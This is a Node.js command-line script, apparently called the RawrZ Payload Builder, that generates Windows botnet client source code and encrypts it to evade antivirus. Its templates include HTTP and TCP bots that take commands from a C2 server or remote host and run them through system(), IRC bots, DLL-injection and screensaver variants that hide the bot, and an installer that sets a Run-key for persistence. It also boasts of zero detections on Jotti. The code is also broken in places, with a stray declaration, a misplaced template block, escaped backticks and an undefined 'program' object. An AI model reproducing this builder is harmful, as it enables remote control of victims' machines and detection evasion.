#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// RAWRZ CLI - Command Line Payload Builder
console.log(`
🔥 RawrZ Payload Builder CLI - UNLEASHED 🔥
Advanced Security Tools & Payload Generation Platform

🏆 YOUR JOTTI SUCCESS: 0/13 detections on test_payload_encrypted.rawrz!
🎯 Ready to generate IRC/HTTP bots with the same FUD encryption!
`);

// Bot Templates
const botTemplates // Quick generation commands without commander
const args = process.argv.slice(2);

if (args.length === 0) {
  console.log(`💡 RawrZ CLI Quick Commands:`);
  console.log(`📡 node rawrz-cli.js irc    - Generate IRC bot (.exe, encrypted)`);
  console.log(`🌐 node rawrz-cli.js http   - Generate HTTP bot (.exe, encrypted)`);
  console.log(`🔗 node rawrz-cli.js tcp    - Generate TCP bot (.exe, encrypted)`);
  console.log(`🔐 node rawrz-cli.js encrypt <file> - Encrypt any file with RAWRZ1`);
  console.log(`🧪 node rawrz-cli.js test   - Create test payload (like your 0/13 success!)`);
  console.log(``);
  console.log(`🏆 All bots auto-encrypted with your proven RAWRZ1 method!`);
} else {
  const command = args[0];
  
  switch(command) {
    case 'irc':
      generateQuickBot('irc', 'exe', {
        server: 'irc.libera.chat',
        port: 6667,
        channel: '#test',
        nick: `bot_${Date.now()}`
      });
      break;
      
    case 'http':
      generateQuickBot('http', 'exe', {
        c2url: 'https://your-c2.example.com/api',
        beacon: 60,
        useragent: 'Mozilla/5.0'
      });
      break;
      
    case 'tcp':
      generateQuickBot('tcp', 'exe', {
        host: '127.0.0.1',
        port: 4444
      });
      break;
      
    case 'encrypt':
      if (args[1]) {
        encryptQuickFile(args[1]);
      } else {
        console.log(`❌ Usage: node rawrz-cli.js encrypt <filename>`);
      }
      break;
      
    case 'test':
      generateTestPayload();
      break;
      
    default:
      console.log(`❌ Unknown command: ${command}`);
      console.log(`💡 Available: irc, http, tcp, encrypt, test`);
  }
}

// Quick bot generator
async function generateQuickBot(type, format, config) {
  const timestamp = Date.now();
  const filename = `${type}_bot_${timestamp}.${format}`;
  const encryptedFilename = `${type}_bot_${timestamp}.rawrz`;
  
  console.log(`🔥 Generating ${type.toUpperCase()} bot...`);
  console.log(`📝 Config: ${JSON.stringify(config, null, 2)}`);
  
  try {
    const result = await generateBot(type, format, config, filename);
    
    if (result.success) {
      console.log(`✅ Bot generated: ${filename}`);
      
      // Auto-encrypt with RAWRZ1
      console.log(`🔐 Auto-encrypting with RAWRZ1...`);
      const encResult = await encryptFile(filename, encryptedFilename);
      
      if (encResult.success) {
        console.log(`🎯 READY FOR JOTTI: ${encryptedFilename}`);
        console.log(`🔑 Encryption Key: ${encResult.keyHex}`);
        console.log(`📊 Size: ${encResult.sizeIn} → ${encResult.sizeOut} bytes`);
        console.log(``);
        console.log(`🏆 Upload ${encryptedFilename} to virusscan.jotti.org`);
        console.log(`🎯 Expected: 0/X detections (like your previous success!)`);
      }
    }
  } catch (error) {
    console.error(`❌ Generation failed: ${error.message}`);
  }
}

// Quick file encryption
async function encryptQuickFile(inputFile) {
  if (!fs.existsSync(inputFile)) {
    console.error(`❌ File not found: ${inputFile}`);
    return;
  }
  
  const outputFile = inputFile + '.rawrz';
  console.log(`🔐 Encrypting: ${inputFile} → ${outputFile}`);
  
  const result = await encryptFile(inputFile, outputFile);
  
  if (result.success) {
    console.log(`✅ Encrypted successfully!`);
    console.log(`🔑 Key: ${result.keyHex}`);
    console.log(`📊 Size: ${result.sizeIn} → ${result.sizeOut} bytes`);
    console.log(`🧪 Ready for Jotti: ${outputFile}`);
  } else {
    console.error(`❌ Encryption failed: ${result.error}`);
  }
}

// Generate test payload like the successful one
async function generateTestPayload() {
  const testCode = `// RawrZ Test Payload - Proven FUD
#include <windows.h>
#include <iostream>

int main() {
    MessageBox(NULL, "RawrZ FUD Test Successful!", "Success", MB_OK);
    std::cout << "Payload executed successfully" << std::endl;
    return 0;
}`;

  console.log(`🧪 Creating test payload (like your 0/13 success)...`);
  
  const filename = `rawrz_test_${Date.now()}.cpp`;
  const encryptedFilename = `rawrz_test_${Date.now()}.rawrz`;
  
  fs.writeFileSync(filename, testCode);
  console.log(`✅ Test payload created: ${filename}`);
  
  const result = await encryptFile(filename, encryptedFilename);
  
  if (result.success) {
    console.log(`🎯 READY FOR JOTTI: ${encryptedFilename}`);
    console.log(`🔑 Key: ${result.keyHex}`);
    console.log(`📊 Size: ${result.sizeIn} → ${result.sizeOut} bytes`);
    console.log(``);
    console.log(`🏆 This should achieve 0/X like your previous test!`);
  }
}
  'irc': {
    'exe': (config) => `// IRC Bot EXE - Generated ${new Date().toISOString()}
// Server: ${config.server}:${config.port}
// Channel: ${config.channel}
// Nickname: ${config.nick}

#include <winsock2.h>
#include <windows.h>

const char* IRC_SERVER = "${config.server}";
const int IRC_PORT = ${config.port};
const char* IRC_CHANNEL = "${config.channel}";
const char* IRC_NICK = "${config.nick}";

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(IRC_PORT);
    server.sin_addr.s_addr = inet_addr(IRC_SERVER);
    
    if(connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
        char buffer[512];
        sprintf(buffer, "NICK %s\\r\\n", IRC_NICK);
        send(sock, buffer, strlen(buffer), 0);
        sprintf(buffer, "USER %s 0 * :Bot\\r\\n", IRC_NICK);
        send(sock, buffer, strlen(buffer), 0);
        sprintf(buffer, "JOIN %s\\r\\n", IRC_CHANNEL);
        send(sock, buffer, strlen(buffer), 0);
        
        // Command loop
        while(true) {
            int bytes = recv(sock, buffer, sizeof(buffer)-1, 0);
            if(bytes > 0) {
                buffer[bytes] = 0;
                // Process IRC commands
                if(strstr(buffer, "PING")) {
                    char pong[256];
                    sprintf(pong, "PONG %s\\r\\n", strchr(buffer, ':'));
                    send(sock, pong, strlen(pong), 0);
                }
            }
        }
    }
    
    closesocket(sock);
    WSACleanup();
    return 0;
}`,
    'dll': (config) => `// IRC Bot DLL - Injection Template
#include <windows.h>

const char* IRC_SERVER = "${config.server}";
const int IRC_PORT = ${config.port};

DWORD WINAPI IrcBotThread(LPVOID lpParam) {
    // IRC bot implementation in separate thread
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, IrcBotThread, NULL, 0, NULL);
        break;
    }
    return TRUE;
}`,
    'scr': (config) => `// IRC Bot Screensaver
#include <windows.h>
#include <scrnsave.h>

// Hidden IRC bot functionality in screensaver
const char* IRC_SERVER = "${config.server}";
const char* IRC_CHANNEL = "${config.channel}";

LRESULT WINAPI ScreenSaverProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch(message) {
        case WM_CREATE:
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IrcBotMain, NULL, 0, NULL);
            break;
    }
    return DefScreenSaverProc(hWnd, message, wParam, lParam);
}`
  },
  'http': {
    'exe': (config) => `// HTTP Bot EXE - Generated ${new Date().toISOString()}
// C2 Server: ${config.c2url}
// Beacon Interval: ${config.beacon}s
// User-Agent: ${config.useragent}

#include <windows.h>
#include <wininet.h>

const char* C2_URL = "${config.c2url}";
const int BEACON_INTERVAL = ${config.beacon};
const char* USER_AGENT = "${config.useragent}";

int main() {
    while(true) {
        HINTERNET hSession = InternetOpen(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if(hSession) {
            HINTERNET hConnect = InternetOpenUrl(hSession, C2_URL, NULL, 0, 
                INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
            if(hConnect) {
                char buffer[1024];
                DWORD bytesRead;
                if(InternetReadFile(hConnect, buffer, sizeof(buffer)-1, &bytesRead)) {
                    buffer[bytesRead] = 0;
                    // Process C2 commands
                    if(strstr(buffer, "shell:")) {
                        // Execute shell command
                        system(buffer + 6);
                    } else if(strstr(buffer, "download:")) {
                        // Download file
                    } else if(strstr(buffer, "upload:")) {
                        // Upload file
                    }
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hSession);
        }
        Sleep(BEACON_INTERVAL * 1000);
    }
    return 0;
}`,
    'dll': (config) => `// HTTP Bot DLL - Injection Template
#include <windows.h>
#include <wininet.h>

const char* C2_URL = "${config.c2url}";

DWORD WINAPI HttpBotThread(LPVOID lpParam) {
    // HTTP bot implementation
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, HttpBotThread, NULL, 0, NULL);
        break;
    }
    return TRUE;
}`,
    'msi': (config) => `// HTTP Bot MSI Installer Template
// C2 Server: ${config.c2url}
// This generates source for MSI creation with InstallShield or WiX

Product: HttpBot
Version: 1.0.0
Manufacturer: Software Inc.

[Files]
HttpBot.exe=C:\\Program Files\\HttpBot\\HttpBot.exe

[Registry]
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HttpBot=C:\\Program Files\\HttpBot\\HttpBot.exe

[InstallExecuteSequence]
HttpBotInstall=1`
  },
  'tcp': {
    'exe': (config) => `// TCP Bot EXE - Raw Socket Template
// Host: ${config.host}:${config.port}
// Protocol: ${config.protocol}

#include <winsock2.h>
#include <windows.h>

const char* TCP_HOST = "${config.host}";
const int TCP_PORT = ${config.port};

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(TCP_PORT);
    server.sin_addr.s_addr = inet_addr(TCP_HOST);
    
    if(connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
        char buffer[1024];
        while(true) {
            int bytes = recv(sock, buffer, sizeof(buffer)-1, 0);
            if(bytes > 0) {
                buffer[bytes] = 0;
                // Process TCP commands
                if(strncmp(buffer, "exec:", 5) == 0) {
                    system(buffer + 5);
                }
            }
        }
    }
    
    closesocket(sock);
    WSACleanup();
    return 0;
}`
  }
};

// RAWRZ1 Encryption
async function encryptFile(inputPath, outputPath, hexKey) {
  try {
    if (!fs.existsSync(inputPath)) {
      throw new Error('Input file not found');
    }

    const key = hexKey ? Buffer.from(hexKey, 'hex') : crypto.randomBytes(32);
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    const data = await fs.promises.readFile(inputPath);
    const enc = Buffer.concat([cipher.update(data), cipher.final()]);
    const tag = cipher.getAuthTag();
    const header = Buffer.from('RAWRZ1');
    const fileBuf = Buffer.concat([header, iv, tag, enc]);
    
    await fs.promises.writeFile(outputPath, fileBuf);
    
    return {
      success: true,
      keyHex: key.toString('hex'),
      sizeIn: data.length,
      sizeOut: fileBuf.length
    };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

// Generate bot payload
async function generateBot(type, format, config, output) {
  try {
    const template = botTemplates[type]?.[format];
    if (!template) {
      throw new Error(`Template not found for ${type}.${format}`);
    }
    
    const code = template(config);
    await fs.promises.writeFile(output, code);
    
    console.log(`✅ Generated ${type} bot as ${format}: ${output}`);
    console.log(`📊 Size: ${code.length} bytes`);
    
    return { success: true, path: output, size: code.length };
  } catch (error) {
    console.error(`❌ Generation failed: ${error.message}`);
    return { success: false, error: error.message };
  }
}

// CLI Commands
program
  .name('rawrz-cli')
  .description('RawrZ Payload Builder - Command Line Interface')
  .version('3.1.4');

// Generate IRC Bot
program
  .command('irc')
  .description('Generate IRC bot payload')
  .option('-s, --server <server>', 'IRC server', 'irc.server.com')
  .option('-p, --port <port>', 'IRC port', '6667')
  .option('-c, --channel <channel>', 'IRC channel', '#botnet')
  .option('-n, --nick <nick>', 'Bot nickname', `bot_${Date.now()}`)
  .option('-f, --format <format>', 'Output format (exe|dll|scr|msi|com)', 'exe')
  .option('-o, --output <output>', 'Output file', 'ircbot')
  .option('-e, --encrypt', 'Auto-encrypt with RAWRZ1')
  .option('-k, --key <key>', 'Encryption key (hex)')
  .action(async (options) => {
    const config = {
      server: options.server,
      port: parseInt(options.port),
      channel: options.channel,
      nick: options.nick
    };
    
    const outputFile = \`\${options.output}.\${options.format}\`;
    console.log(\`🔥 Generating IRC bot: \${options.format.toUpperCase()}\`);
    console.log(\`📡 Server: \${config.server}:\${config.port}\`);
    console.log(\`💬 Channel: \${config.channel}\`);
    console.log(\`🤖 Nickname: \${config.nick}\`);
    
    const result = await generateBot('irc', options.format, config, outputFile);
    
    if (result.success && options.encrypt) {
      console.log(\`🔐 Encrypting with RAWRZ1...\`);
      const encResult = await encryptFile(outputFile, outputFile + '.rawrz', options.key);
      if (encResult.success) {
        console.log(\`✅ Encrypted: \${outputFile}.rawrz\`);
        console.log(\`🔑 Key: \${encResult.keyHex}\`);
        console.log(\`📊 Size: \${encResult.sizeIn} → \${encResult.sizeOut} bytes\`);
      }
    }
  });

// Generate HTTP Bot
program
  .command('http')
  .description('Generate HTTP bot payload')
  .option('-u, --c2url <url>', 'C2 server URL', 'https://your-c2.com/api')
  .option('-b, --beacon <interval>', 'Beacon interval (seconds)', '60')
  .option('-a, --useragent <agent>', 'User agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
  .option('-f, --format <format>', 'Output format (exe|dll|scr|msi|com)', 'exe')
  .option('-o, --output <output>', 'Output file', 'httpbot')
  .option('-e, --encrypt', 'Auto-encrypt with RAWRZ1')
  .option('-k, --key <key>', 'Encryption key (hex)')
  .action(async (options) => {
    const config = {
      c2url: options.c2url,
      beacon: parseInt(options.beacon),
      useragent: options.useragent
    };
    
    const outputFile = \`\${options.output}.\${options.format}\`;
    console.log(\`🌐 Generating HTTP bot: \${options.format.toUpperCase()}\`);
    console.log(\`🎯 C2 Server: \${config.c2url}\`);
    console.log(\`⏱️  Beacon: \${config.beacon}s\`);
    
    const result = await generateBot('http', options.format, config, outputFile);
    
    if (result.success && options.encrypt) {
      console.log(\`🔐 Encrypting with RAWRZ1...\`);
      const encResult = await encryptFile(outputFile, outputFile + '.rawrz', options.key);
      if (encResult.success) {
        console.log(\`✅ Encrypted: \${outputFile}.rawrz\`);
        console.log(\`🔑 Key: \${encResult.keyHex}\`);
        console.log(\`📊 Size: \${encResult.sizeIn} → \${encResult.sizeOut} bytes\`);
      }
    }
  });

// Generate TCP Bot
program
  .command('tcp')
  .description('Generate TCP bot payload')
  .option('-h, --host <host>', 'Target host', '127.0.0.1')
  .option('-p, --port <port>', 'Target port', '4444')
  .option('-r, --protocol <protocol>', 'Protocol (tcp|tcp-ssl)', 'tcp')
  .option('-f, --format <format>', 'Output format (exe|dll|scr)', 'exe')
  .option('-o, --output <output>', 'Output file', 'tcpbot')
  .option('-e, --encrypt', 'Auto-encrypt with RAWRZ1')
  .option('-k, --key <key>', 'Encryption key (hex)')
  .action(async (options) => {
    const config = {
      host: options.host,
      port: parseInt(options.port),
      protocol: options.protocol
    };
    
    const outputFile = \`\${options.output}.\${options.format}\`;
    console.log(\`🔗 Generating TCP bot: \${options.format.toUpperCase()}\`);
    console.log(\`🎯 Target: \${config.host}:\${config.port}\`);
    console.log(\`🔒 Protocol: \${config.protocol}\`);
    
    const result = await generateBot('tcp', options.format, config, outputFile);
    
    if (result.success && options.encrypt) {
      console.log(\`🔐 Encrypting with RAWRZ1...\`);
      const encResult = await encryptFile(outputFile, outputFile + '.rawrz', options.key);
      if (encResult.success) {
        console.log(\`✅ Encrypted: \${outputFile}.rawrz\`);
        console.log(\`🔑 Key: \${encResult.keyHex}\`);
        console.log(\`📊 Size: \${encResult.sizeIn} → \${encResult.sizeOut} bytes\`);
      }
    }
  });

// Encrypt file
program
  .command('encrypt <inputFile>')
  .description('Encrypt file with RAWRZ1 format')
  .option('-o, --output <output>', 'Output file (default: input + .rawrz)')
  .option('-k, --key <key>', 'Encryption key (hex, generates random if not provided)')
  .action(async (inputFile, options) => {
    const outputFile = options.output || (inputFile + '.rawrz');
    console.log(\`🔐 Encrypting: \${inputFile}\`);
    
    const result = await encryptFile(inputFile, outputFile, options.key);
    
    if (result.success) {
      console.log(\`✅ Encrypted: \${outputFile}\`);
      console.log(\`🔑 Key: \${result.keyHex}\`);
      console.log(\`📊 Size: \${result.sizeIn} → \${result.sizeOut} bytes (+\${result.sizeOut - result.sizeIn} bytes overhead)\`);
      console.log(\`💡 Save this key for decryption!\`);
    } else {
      console.error(\`❌ Encryption failed: \${result.error}\`);
    }
  });

// List available formats
program
  .command('formats')
  .description('List available output formats')
  .action(() => {
    console.log(\`📋 Available Output Formats:\`);
    console.log(\`\`);
    console.log(\`🏆 Most Common (Jotti tested):\`);
    console.log(\`  exe  - Windows executable (heavily scanned)\`);
    console.log(\`  dll  - Dynamic Link Library (process injection)\`);
    console.log(\`  scr  - Screensaver (often trusted)\`);
    console.log(\`  msi  - Windows Installer (trusted format)\`);
    console.log(\`  com  - DOS executable (legacy, often ignored)\`);
    console.log(\`\`);
    console.log(\`🎯 Advanced Formats:\`);
    console.log(\`  jar  - Java Archive (cross-platform)\`);
    console.log(\`  elf  - Linux executable\`);
    console.log(\`  app  - macOS application\`);
    console.log(\`\`);
    console.log(\`💡 Recommendation for FUD: Use .scr or .msi with RAWRZ1 encryption\`);
  });

// Quick examples
program
  .command('examples')
  .description('Show usage examples')
  .action(() => {
    console.log(\`🔥 RawrZ CLI Examples:\`);
    console.log(\`\`);
    console.log(\`📡 Generate IRC bot as EXE and encrypt:\`);
    console.log(\`  node rawrz-cli.js irc -s irc.server.com -p 6667 -c "#botnet" -f exe -e\`);
    console.log(\`\`);
    console.log(\`🌐 Generate HTTP bot as SCR (screensaver):\`);
    console.log(\`  node rawrz-cli.js http -u "https://c2.example.com/api" -f scr -e\`);
    console.log(\`\`);
    console.log(\`🔗 Generate TCP bot as DLL:\`);
    console.log(\`  node rawrz-cli.js tcp -h 192.168.1.100 -p 4444 -f dll -e\`);
    console.log(\`\`);
    console.log(\`🔐 Encrypt existing file:\`);
    console.log(\`  node rawrz-cli.js encrypt calc.exe -o calc_encrypted.rawrz\`);
    console.log(\`\`);
    console.log(\`🏆 Full Jotti workflow:\`);
    console.log(\`  1. Generate: node rawrz-cli.js irc -f scr -e\`);
    console.log(\`  2. Upload .rawrz file to virusscan.jotti.org\`);
    console.log(\`  3. Check for 0/X detections (FUD success!)\`);
  });

program.parse();

if (process.argv.length === 2) {
  console.log(\`💡 Use 'node rawrz-cli.js --help' for usage or 'node rawrz-cli.js examples' for examples\`);
  console.log(\`🚀 Quick start: node rawrz-cli.js irc -e (generates encrypted IRC bot)\`);
}